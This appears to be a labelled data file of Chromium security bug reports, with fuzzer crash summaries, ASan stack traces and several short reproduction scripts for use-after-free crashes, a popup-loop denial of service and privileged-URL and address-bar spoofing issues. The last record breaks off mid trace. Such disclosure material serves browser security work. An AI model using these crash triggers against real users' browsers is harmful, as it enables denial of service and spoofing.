heap-use-after-free in webcore idbdatabase transactionfinished detailed report fuzzer inferno_layout_test_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 4 crash address crash state crash stack webcore idbdatabase transactionfinished webcore idbtransaction oncomplete free stack webcore idbdatabase transactionfinished webcore idbtransaction oncomplete unminimized testcase	11
use-after-free on webcore majorgcwrappervisitor visitpersistenthandle this crash has been found by the last syzyasan canary 28.0.1490.1 we ve seen it 1 time you can go to to get more information about how to treat this bug error type read of size 4 alloc_stack 62 void alloc_stack_size free_stack 62 void free_stack_size error_type 1 use_after_free access_mode 0 asan_read_access access_size 4 shadow_info 128 is located 11 bytes inside of 792-bytes region microseconds_since_free stack trace of the crash chrome webcore majorgcwrappervisitor visitpersistenthandle c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\v8gccontroller.cpp 382 chrome v8 visitoradapter visitembedderreference c b\build\slave\win-asan\build\src\v8\src\api.cc 4892 chrome v8 internal globalhandles iterateallrootswithclassids c b\build\slave\win-asan\build\src\v8\src\global-handles.cc 720 chrome v8 v8 visithandleswithclassids c b\build\slave\win-asan\build\src\v8\src\api.cc 4906 chrome webcore v8gccontroller majorgcprologue c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\v8gccontroller.cpp 445 chrome webcore v8gccontroller gcprologue c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\v8gccontroller.cpp 421 chrome v8 internal heap callgcprologuecallbacks c b\build\slave\win-asan\build\src\v8\src\heap.cc 1038 chrome v8 internal heap performgarbagecollection c b\build\slave\win-asan\build\src\v8\src\heap.cc 898 chrome v8 internal heap collectgarbage c b\build\slave\win-asan\build\src\v8\src\heap.cc 662 chrome v8 internal heap collectallgarbage c b\build\slave\win-asan\build\src\v8\src\heap.cc 573 chrome v8 internal heap advanceidleincrementalmarking c b\build\slave\win-asan\build\src\v8\src\heap.cc 5706 chrome v8 internal heap idlenotification c b\build\slave\win-asan\build\src\v8\src\heap.cc 5809 chrome v8 internal v8 idlenotification c b\build\slave\win-asan\build\src\v8\src\v8.cc 195 chrome v8 v8 idlenotification c b\build\slave\win-asan\build\src\v8\src\api.cc 4928 chrome content renderthreadimpl idlehandler c b\build\slave\win-asan\build\src\content\renderer\render_thread_impl.cc 885 chrome base timer runscheduledtask c b\build\slave\win-asan\build\src\base\timer.cc 181 chrome base basetimertaskinternal run c b\build\slave\win-asan\build\src\base\timer.cc 47 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop.cc 486 chrome base messageloop dodelayedwork c b\build\slave\win-asan\build\src\base\message_loop.cc 726 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 442 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base messageloop run c b\build\slave\win-asan\build\src\base\message_loop.cc 322 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 235 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 431 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 738 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 210 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 100 chrome generic_cpp_alloc c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 16 chrome webcore v8xmlhttprequest constructorcustom c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\custom\v8xmlhttprequestcustom.cpp 62 chrome webcore v8xmlhttprequest constructorcallback c b\build\slave\win-asan\build\src\build\release\obj\global_intermediate\webcore\bindings\v8xmlhttprequest.cpp 736 chrome v8 internal handleapicallhelper 1 c b\build\slave\win-asan\build\src\v8\src\builtins.cc 1333 chrome v8 internal builtin_handleapicallconstruct c b\build\slave\win-asan\build\src\v8\src\builtins.cc 1355 free stack trace asan_rtl agent asan heapproxy free e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 251 asan_rtl asan_heapfree e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 128 chrome webcore xmlhttprequest scalar deleting destructor chrome webcore xmlhttprequest derefeventtarget c b\build\slave\win-asan\build\src\third_party\webkit\source\core\xml\xmlhttprequest.h 158 chrome webcore v8deviceorientationevent derefobject c b\build\slave\win-asan\build\src\build\release\obj\global_intermediate\webcore\bindings\v8webkitcssmatrix.cpp 928 chrome webcore weakhandlelistener webcore scriptwrappable webcore scriptwrappable invokeweakcallback c b\build\slave\win-asan\build\src\third_party\webkit\source\bindings\v8\v8utilities.h 81 chrome v8 internal globalhandles node postgarbagecollectionprocessing c b\build\slave\win-asan\build\src\v8\src\global-handles.cc 285 chrome v8 internal globalhandles postgarbagecollectionprocessing c b\build\slave\win-asan\build\src\v8\src\global-handles.cc 667 chrome v8 internal heap performgarbagecollection c b\build\slave\win-asan\build\src\v8\src\heap.cc 1004 chrome v8 internal heap collectgarbage c b\build\slave\win-asan\build\src\v8\src\heap.cc 662 chrome v8 internal heap collectallgarbage c b\build\slave\win-asan\build\src\v8\src\heap.cc 573 chrome v8 internal heap idlenotification c b\build\slave\win-asan\build\src\v8\src\heap.cc 5741 chrome v8 internal v8 idlenotification c b\build\slave\win-asan\build\src\v8\src\v8.cc 195 chrome webcore threadtimers sharedtimerfired c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\threadtimers.cpp 106 chrome base basetimertaskinternal run c b\build\slave\win-asan\build\src\base\timer.cc 47 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop.cc 689 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_pump_default.cc 30 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 442 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base messageloop run c b\build\slave\win-asan\build\src\base\message_loop.cc 322 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 235 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 431 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 738 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 chrome chromemain c b\build\slave\win-asan\build\src\chrome\app\chrome_main.cc 28 chrome maindllloader launch c b\build\slave\win-asan\build\src\chrome\app\client_util.cc 445 chrome runchrome c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 32 chrome wwinmain c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 47 chrome tmaincrtstartup f dd\vctools\crt_bld\self_x86\crt\src\crt0.c 275 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart	11
assertion failed hasraredata unknown in webcore node raredata detailed report fuzzer inferno_twister job type linux_asan_chrome_v8 crash type unknown crash address crash state crash stack webcore node raredata webcore node decrementconnectedsubframecount webcore htmlframeownerelement clearcontentframe regressed minimized testcase 1.10 kb	11
security page can ddos and crash browser while 1 window.open vulnerability details please provide a brief explanation of the security issue div onclick while 1 window.open win div click win a million popups are blocked but the browser hangs and then crashes the questions i have this needs to be user-initiated with a click that means that user_gesture will be true and i do n't know how this affects things blockedcontentcontainer addwebcontents should be kicking out popups after 30 of them why is n't it doing so version tot r219277	11
heap-use-after-free in webcore svgmatrixv8internal rotatemethodcallback detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free read 48 crash address crash state crash stack webcore svgmatrixv8internal rotatemethodcallback v8 internal functioncallbackarguments call free stack webcore svglistproperty webcore svgtransformlist initializevaluesandwrappers webcore svgtransformlistv8internal initializemethodcallback minimized testcase 8.12 kb	11
fileutilitiesmessagefilter onopenfile insufficient permission checks fileutilitiesmessagefilter onopenfile allows the renderer to open a file for writing while cpsp has only granted it read permissions if childprocesssecuritypolicyimpl getinstance canreadfile process_id path return base platformfile file_handle base createplatformfile path mode 0 base platform_file_open base platform_file_read base platform_file_create_always base platform_file_write so any grantreadfile effectively also grants write permissions attached is a poc demonstrating that a compromised renderer can modify a file to be uploaded apply repro.patch open repro.html	11
heap-buffer-overflow in bool webcore selectorchecker checkone webcore domsiblingtraversalstrategy the following stylesheet makes blink crash style webkit-any style webkit-any is recognized as a pseudo class with the escaped parenthesis as part of the name but instead of recognizing it as an unknown pseudo class it s incorrectly stored as a valid webkit-any pseudo function	11
security blocked popups can navigate anywhere once unblocked vulnerability details renderer-initiated navigations are generally not allowed to navigate to webui or other privileged urls with the new popup-blocking logic we ve lost the check that prevents that i think it used to go through webcore securityorigin candisplay now a normal web page can call window.open chrome settings and if the user unblocks the popup the privileged page will load there are several mitigating factors that make me think this is low severity 1 the page does not load automatically and requires user interaction 2 the url is visible in the blocked popup dialog if you go to unblock it 3 even after unblocking the original page does not seem to have a way to script the popup which was a necessary step in past exploits that were able to use webui pages to escape the sandbox however any state-changing webui urls still pose a risk for users who do n't understand what the url might do simple cases like window.open chrome restart and window.open chrome crash work but i m not sure if there are other webui urls that could cause settings changes simply by visiting them this appears to have regressed with the new popup-blocking logic in r214041 regression range from bisect-builds version chrome version 30.0.1599.0 dev operating system all reproduction case script window.open chrome settings script	11
tracking bug for internal security fixes for chrome 30 release 0 see high medium low	11
assertion failed splineindex m_keysplines.size unknown in webcore svganimationelement calculatepercentforspline detailed report fuzzer inferno_twister job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack webcore svganimationelement calculatepercentforspline webcore svganimationelement currentvaluesforvaluesanimation webcore svganimationelement updateanimation minimized testcase 4.36 kb	11
heap-buffer-overflow on icu_46 charsetrecog_utf_32_be getchar this crash has been found by the last syzyasan canary 31.0.1602.1 we ve seen it 42 times you can go to to get more information about how to treat this bug error type read of size 1 location void context context alloc_stack 62 void alloc_stack_size alloc_tid free_stack 62 null free_stack_size 0 free_tid 0 crash_stack_id error_type 4 heap_buffer_overflow access_mode 0 asan_read_access access_size 1 shadow_info 128 0a804491 is 0 bytes beyond 1-byte block 0a804490,0a804491 microseconds_since_free 0 stack trace of the crash chrome icu_46 charsetrecog_utf_32_be getchar c b\build\slave\win-asan\build\src\third_party\icu\source\i18n\csrucode.cpp 125 chrome icu_46 charsetrecog_utf_32 match c b\build\slave\win-asan\build\src\third_party\icu\source\i18n\csrucode.cpp 79 chrome icu_46 charsetdetector detectall c b\build\slave\win-asan\build\src\third_party\icu\source\i18n\csdetect.cpp 282 chrome ucsdet_detectall_46 c b\build\slave\win-asan\build\src\third_party\icu\source\i18n\ucsdet.cpp 121 chrome webcore detecttextencoding c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\text\textencodingdetectoricu.cpp 65 chrome webcore textresourcedecoder flush c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\textresourcedecoder.cpp 669 chrome webcore decodeddatadocumentparser flush c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\decodeddatadocumentparser.cpp 116 chrome webcore documentwriter end c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentwriter.cpp 126 chrome webcore documentloader finishedloading c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentloader.cpp 346 chrome webcore documentloader notifyfinished c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentloader.cpp 309 chrome webcore resource checknotify c b\build\slave\win-asan\build\src\third_party\webkit\source\core\fetch\resource.cpp 200 chrome webcore resourceloader didfinishloading c b\build\slave\win-asan\build\src\third_party\webkit\source\core\fetch\resourceloader.cpp 352 chrome webkit_glue weburlloaderimpl context oncompletedrequest c b\build\slave\win-asan\build\src\webkit\child\weburlloader_impl.cc 733 chrome content resourcedispatcher onrequestcomplete c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 514 chrome dispatchtomethod content resourcedispatcher void thiscall content resourcedispatcher int int bool std basic_string char std char_traits char std allocator char const base timeticks const int int bool std basic_string char std char_traits char std allocator char base timeticks c b\build\slave\win-asan\build\src\base\tuple.h 584 chrome resourcemsg_requestcomplete dispatch content resourcedispatcher content resourcedispatcher void thiscall content resourcedispatcher int int bool std basic_string char std char_traits char std allocator char const base timeticks const c b\build\slave\win-asan\build\src\content\common\resource_messages.h 268 chrome content resourcedispatcher dispatchmessagew c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 615 chrome content resourcedispatcher onmessagereceived c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 305 chrome content childthread onmessagereceived c b\build\slave\win-asan\build\src\content\child\child_thread.cc 314 chrome ipc channelproxy context ondispatchmessage c b\build\slave\win-asan\build\src\ipc\ipc_channel_proxy.cc 270 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const run c b\build\slave\win-asan\build\src\base\bind_internal.h 1253 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 484 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 609 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_loop\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 437 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base messageloop run c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 308 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 241 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 443 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 763 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 175 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 608 chrome malloc c b\build\slave\win-asan\build\src\base\allocator\allocator_shim.cc 140 chrome wtf vector unsigned char,0 reservecapacity c b\build\slave\win-asan\build\src\third_party\webkit\source\wtf\vector.h 865 chrome webcore textresourcedecoder checkforxmlcharset c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\textresourcedecoder.cpp 511 chrome webcore textresourcedecoder decode c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\textresourcedecoder.cpp 618 chrome webcore decodeddatadocumentparser appendbytes c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\decodeddatadocumentparser.cpp 97 chrome webcore documentwriter adddata c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentwriter.cpp 105 chrome webcore documentloader commitdata c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentloader.cpp 631 chrome webcore documentloader datareceived c b\build\slave\win-asan\build\src\third_party\webkit\source\core\loader\documentloader.cpp 661 chrome webcore rawresource appenddata c b\build\slave\win-asan\build\src\third_party\webkit\source\core\fetch\rawresource.cpp 49 chrome webcore resourceloader didreceivedata c b\build\slave\win-asan\build\src\third_party\webkit\source\core\fetch\resourceloader.cpp 338 chrome webkit_glue weburlloaderimpl context onreceiveddata c b\build\slave\win-asan\build\src\webkit\child\weburlloader_impl.cc 695 chrome content resourcedispatcher onreceiveddata c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 420 chrome resourcemsg_datareceived dispatch content resourcedispatcher content resourcedispatcher int int int int c b\build\slave\win-asan\build\src\content\common\resource_messages.h 253 chrome content resourcedispatcher dispatchmessagew c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 613 chrome content resourcedispatcher onmessagereceived c b\build\slave\win-asan\build\src\content\child\resource_dispatcher.cc 305 chrome content childthread onmessagereceived c b\build\slave\win-asan\build\src\content\child\child_thread.cc 314 chrome ipc channelproxy context ondispatchmessage c b\build\slave\win-asan\build\src\ipc\ipc_channel_proxy.cc 270 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath void cdecl anonymous namespace writablefilechecker std vector base filepath std allocator base filepath const run c b\build\slave\win-asan\build\src\base\bind_internal.h 1253 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 484 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 609 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_loop\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 437 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base messageloop run c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 308 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 241 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 443 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 763 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 chrome chromemain c b\build\slave\win-asan\build\src\chrome\app\chrome_main.cc 28 chrome maindllloader launch c b\build\slave\win-asan\build\src\chrome\app\client_util.cc 189 chrome anonymous namespace runchrome c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 49 chrome wwinmain c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 115 chrome tmaincrtstartup f dd\vctools\crt_bld\self_x86\crt\src\crt0.c 275 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart	7
assertion failed m_pendingactivitycount 0 heap-use-after-free in webcore xmlhttprequest open tested on os ubuntu 12.04 chromium asan 31.0.1632.0 developer build 223309 repro-file script function addelement document.documentelement.appendchild document.createtextnode x xhr.open get true document.addeventlistener domcontentloaded addelement false window.onload addelement var xhr new xmlhttprequest function sendxhr xhr.send window.addeventlistener domsubtreemodified sendxhr addelement script asan-report 4753==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 chrome 0 in webcore xmlhttprequest open wtf string const webcore kurl const bool webcore exceptionstate b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/xml/xmlhttprequest.cpp:486:0 1 in webcore v8xmlhttprequest openmethodcustom v8 functioncallbackinfo v8 value const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/custom/v8xmlhttprequestcustom.cpp:195:0 2 in webcore xmlhttprequestv8internal openmethodcallback v8 functioncallbackinfo v8 value const b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8xmlhttprequest.cpp:313:0 3 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/arguments.cc:56:0 4 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/builtins.cc:1272:0 freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in open b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/xml/xmlhttprequest.cpp:485 2 in openmethodcustom b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/custom/v8xmlhttprequestcustom.cpp:195 3 in openmethodcallback b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8xmlhttprequest.cpp:313 4 in call b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/arguments.cc:56	11
heap-use-after-free in webcore canmergelists vulnerability details the following testcase crashes chromes asan build version chrome version asan-symbolized-linux-release-223354 operating system linux 64bit reproduction case script function start o0=tmp document.createelement iframe document.getelementbyid store_div appendchild tmp o1=tmp document.createelement iframe tmp.setattribute seamless document.getelementbyid store_div appendchild tmp window.settimeout startrly 100 var c=0 function startrly o24=o0.parentnode o71=o0.clonenode false window.cb_scriptsrc_69_count=0 window.conce_68=function if c++==5 cb_scriptsrc_69_1 else return null o71.src='javascript window.top.conce_68 document.body.appendchild o71 document.body.appendchild o24 document.designmode='on document.execcommand selectall false null document.execcommand fontname false arial document.execcommand insertunorderedlist false null document.execcommand italic false false document.execcommand undo false null document.execcommand indent false null function cb_scriptsrc_69_1 document.execcommand insertunorderedlist false null document.execcommand justifycenter false null script body onload start h1 test h1 div id store_div div body for crashes please include the following additional information type of crash tab crash state see attached stack.txt for asan output	11
heap-use-after-free in webcore htmlformelement submit vulnerability details the following testcase crashes the latest asan build of chrome requires expose-gc version chrome version asan-symbolized-linux-release-224738 operating system linux 64bit reproduction case script function start o179=document.createelement form o180=document.createelement input o180.type='submit o179.addeventlistener submit cb_trigger_onsubmit_25_1 false o179.action='javascript gc o179.appendchild o180 o180.click function cb_trigger_onsubmit_25_1 o179.removechild o180 o179=null window.settimeout start 100 script for crashes please include the following additional information type of crash tab crash state see attached stack.txt for asan output	11
content_shell crash with dump-render-tree and non-ascii content this only repros for me a release build of content_shell with dump-render-tree no repro in debug without dump-render-tree or in chrome repro is script document.write xxxxxxxxxx\u1000\ufffd\ud800\udc00 script this is minimized from the now flaky layout test fast/encoding/api/streaming-decode.html marking as skia just because that s my best guess for now i ll try and get a stack	11
heap-use-after-free in content indexeddbbackingstore transaction begin detailed report fuzzer aedla_ipc_fuzzer job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state crash stack content indexeddbbackingstore transaction begin content indexeddbtransaction processtaskqueue free stack content indexeddbdatabase close content indexeddbconnection close	11
assert bad cast from event to touchevent unknown in bad cast from event to touchevent detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_bad_cast crash type unknown crash address crash state crash stack bad cast from event to touchevent webcore event iscftouchevent webkit webplugincontainerimpl handleevent webcore htmlpluginelement defaulteventhandler minimized testcase 1.05 kb	11
tracking bug for internal security fixes for chrome 31 release 0 see critical high medium	11
assertion failed obj isrenderinline obj this unknown in webcore renderblock createlineboxes detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack webcore renderblock createlineboxes webcore renderblock constructline webcore renderblock createlineboxesfrombidiruns regressed minimized testcase 5.78 kb	11
heap-use-after-free in webcore renderblock checkfloatsincleanline detailed report fuzzer marty_html_twiddler crash type heap-use-after-free read 4 crash address crash state crash stack webcore renderblock checkfloatsincleanline webcore renderblock determineendposition free stack webcore node detach webcore containernode detach minimized testcase 1.95 kb	11
assert bad cast from event to gestureevent unknown in bad cast from event to gestureevent detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_bad_cast crash type unknown crash address crash state crash stack bad cast from event to gestureevent webcore event iscfgestureevent webkit webplugincontainerimpl handleevent webcore htmlpluginelement defaulteventhandler minimized testcase 1.06 kb	11
heap-use-after-free in gpu commandbufferhelper commandbufferhelper detailed report fuzzer lcamtuf_cross_fuzz job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack gpu commandbufferhelper commandbufferhelper gpu gles2 gles2cmdhelper gles2cmdhelper free stack ppapi proxy graphics3d graphics3d ppapi proxy ppb_graphics3d_proxy createproxyresource additional requirements requires interaction gestures	11
assertion failed index static_cast unsigned length unknown in webcore textiterator characterat detailed report fuzzer inferno_twister job type linux_asan_chrome_v8 crash type unknown crash address crash state crash stack webcore textiterator characterat webcore nextboundary webcore endofword regressed minimized testcase 2.52 kb	11
heap-buffer-overflow in null_cipher detailed report fuzzer amtinits_certs job type linux_asan_chrome_mp crash type heap-buffer-overflow write 18434 crash address crash state crash stack null_cipher ssl3_handlerecord ssl3_gathercompletehandshake unminimized testcase	11
assertion failed offset length m_length unknown in webcore inlinetextbox constructtextrun detailed report fuzzer bj_broddelwerk job type linux_asan_content_shell_drt crash type unknown crash address crash state crash stack webcore inlinetextbox constructtextrun webcore inlinetextbox positionforoffset webcore rendertext localcaretrect regressed minimized testcase 5.10 kb	11
libjpeg_turbo huffval infoleak lcamtuf reported two infoleaks in issue 258723 one of them affecting libjpeg_turbo separating it into a new issue testcase turbo-dht.jpg is attached it is a use of uninitialized bytes from a stack buffer the stack buffer is in get_dht uint8 huffval 256 count 0 for i 1 i 16 i input_byte cinfo bits i return false count bits i for i 0 i count i input_byte cinfo huffval i return false memcopy htblptr huffval huffval sizeof htblptr huffval so this copies uninitialized stack memory into htblptr huffval later the uninitialized bytes are accessed here if the image contains large invalid huffman codes define huff_decode_fast s nb htbl s htbl pub huffval int s htbl valoffset nb here s can be large and the index to huffval can be arbitrary libjpeg is not affected because it has a check in jpeg_huff_decode if l 16 warnms state cinfo jwrn_huff_bad_code return 0 fake a zero as the safest result a fix for libjpeg_turbo could do the same or it could memset huffval to nuls	11
heap-use-after-free in webrtc voe channel sendrtcppacket detailed report fuzzer phoglund_webrtc_peerconnection job type linux_asan_content_shell crash type heap-use-after-free read 8 crash address crash state crash stack webrtc voe channel sendrtcppacket webrtc rtcpsender sendrtcp free stack std string talk_base tostring int webrtc buildmediadescription regressed minimized testcase 16.11 kb additional requirements requires http	11
security address bar spoofing on android with window.open 204 no content reported by masatokinugawa as a followup to issue 281256 see comments 22-24 vulnerability details after opening a new window to a url that returns a 204 response code content can be injected from the opener while the original 204 url remains visible leading to a url spoof version chrome version 30.0.1599.82 stable operating system android reproduction case attached	11
security jpeg info leak this page contains an alternating pattern of kitty.jpg a legit hello kitty image and 55.jpg an image that is decoded to what looks like uninitialized memory it may take a couple of reloads but you should eventually see one or more of the 55.jpg images decoding to a distorted hello kitty at the bare minimum this canvas seems like a way to steal images across domains although i suspect that the memory may contain non-image stuff too this also affects firefox safari etc by the looks of it	11
heap-use-after-free in webcore svgmatrixv8internal aattributesettercallback detailed report fuzzer inferno_layout_test_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 48 crash address crash state crash stack webcore svgmatrixv8internal flipxmethodcallback v8 internal functioncallbackarguments call free stack webcore svglistpropertytearoff webcore svgtransformlist commitchange webcore svglistproperty webcore svgtransformlist initializevaluesandwrappers minimized testcase 0.36 kb	11
assert bad cast from element to htmldetailselement unknown in bad cast from element to htmldetailselement detailed report fuzzer inferno_twister_custom_bundle job type linux_asan_content_shell_bad_cast crash type unknown crash address crash state crash stack bad cast from element to htmldetailselement webcore element iscfhtmldetailselement webcore htmlsummaryelement detailselement webcore htmlsummaryelement defaulteventhandler minimized testcase 1.12 kb	11
assertion failed renderer needslayout heap-use-after-free in webcore renderblock linebreaker nextsegmentbreak detailed report fuzzer bj_broddelwerk crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderblock linebreaker nextsegmentbreak webcore renderblock linebreaker nextlinebreak free stack webcore event event webcore mutationevent mutationevent regressed minimized testcase 8.93 kb	11
document.cookie denial-of-service useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.31 khtml like gecko chrome/26.0.1410.43 safari/537.31 steps to reproduce the problem this somewhat minor denial-of-service issue was reported to oss-sec but it s unclear whether it went to web browser vendors or not what is the expected behavior what went wrong denial-of-service did this work before no chrome version 26.0.1410.43 channel n/a os version	9
security use-after-free speech with changing of the page this is a new security bug and i guess it s looks like use-after-free actually it s not easy to repro anyway i ve made a video to see how i repro it before trying to repro the crash you do setting on microsoft settings no audio devices are installed like on the 1.png repro on chrome 29.0.1547.41 beta steps 1 open a new tab 2 then open on it repro.html 3 click on the page then keep clicking faster as possible on try again of speech until the page will change back to that new tab with history methode stack dump childebp retaddr 03a3f1b4 5420f490 chrome_52a80000 content speechrecognitionmanagerimpl onrecognitionerror c b\build\slave\win\build\src\content\browser\speech\speech_recognition_manager_impl.cc 388 03a3f2b0 5420e7e8 chrome_52a80000 content speechrecognitionmanagerimpl recognitionallowedcallback c b\build\slave\win\build\src\content\browser\speech\speech_recognition_manager_impl.cc 217 03a3f2c8 5420e81f chrome_52a80000 base internal invokehelper 1 void base internal runnableadapter void thiscall content speechrecognitionmanagerimpl int bool bool void cdecl base weakptr content speechrecognitionmanagerimpl const int const bool const bool const makeitso c b\build\slave\win\build\src\base\bind_internal.h 971 03a3f2e8 53b587b2 chrome_52a80000 base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall content speechrecognitionmanagerimpl int bool bool void cdecl content speechrecognitionmanagerimpl int bool bool void cdecl base weakptr content speechrecognitionmanagerimpl int void cdecl content speechrecognitionmanagerimpl int bool bool run c b\build\slave\win\build\src\base\bind_internal.h 1491 03a3f2fc 53a65b01 chrome_52a80000 base internal invokehelper 0 void base callback void cdecl int history queryresults void cdecl int const history queryresults const makeitso c b\build\slave\win\build\src\base\bind_internal.h 898 03a3f314 52aaa881 chrome_52a80000 base internal invoker 2 base internal bindstate base callback void cdecl bool bool void cdecl bool bool void cdecl bool bool void cdecl bool bool run c b\build\slave\win\build\src\base\bind_internal.h 1253 03a3f3a8 52aaa491 chrome_52a80000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 486 03a3f4f8 52aac153 chrome_52a80000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 689 03a3f56c 52aac061 chrome_52a80000 base messagepumpforio dorunloop c 